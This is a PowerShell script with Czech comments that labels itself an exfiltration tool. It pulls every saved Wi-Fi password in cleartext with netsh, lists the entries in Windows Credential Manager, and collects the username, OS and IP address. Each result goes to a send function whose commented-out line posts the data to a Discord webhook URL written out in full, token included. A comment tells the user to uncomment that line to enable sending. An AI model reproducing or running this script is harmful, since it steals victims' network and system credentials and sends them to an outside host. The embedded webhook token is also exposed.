$webhook = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_" # Sem dej URL pokud používáš Discord/Slack webhook

function Send-Data($msg) {
    Write-Host $msg
    # Pokud máš webhook, odkomentuj řádek níže:
    # Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$msg})
}

Send-Data "--- STARTING EXFILTRATION ---"
Send-Data "User: $(whoami)"

# 1. VÝTAH PISENÍ WI-FI HESEL (Opraveno)
Send-Data "--- WI-FI PASSWORDS ---"
$profiles = netsh wlan show profiles | Select-String "\:(.*)$" | ForEach-Object { $_.Matches.Value.Trim() }
foreach ($p in $profiles) {
    $pass = netsh wlan show profile name="$p" key=clear | Select-String "Key Content\:(.*)$" | ForEach-Object { $_.Matches.Value.Trim() }
    if ($pass) {
        Send-Data "Network: $p | Password: $pass"
    } else {
        Send-Data "Network: $p | Password: [Not Found/Open]"
    }
}

# 2. WINDOWS CREDENTIAL MANAGER (Systémová hesla)
Send-Data "--- SYSTEM CREDENTIALS ---"
cmd /c "cmdkey /list" | Out-String | ForEach-Object { Send-Data $_ }

# 3. ZÁKLADNÍ INFO O SYSTÉMU
Send-Data "--- SYSTEM INFO ---"
Send-Data "OS: $((Get-WmiObject Win32_OperatingSystem).Caption)"
Send-Data "IP: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object InterfaceAlias -NotLike '*Loopback*').IPAddress)"

Send-Data "--- EXFILTRATION COMPLETE ---"
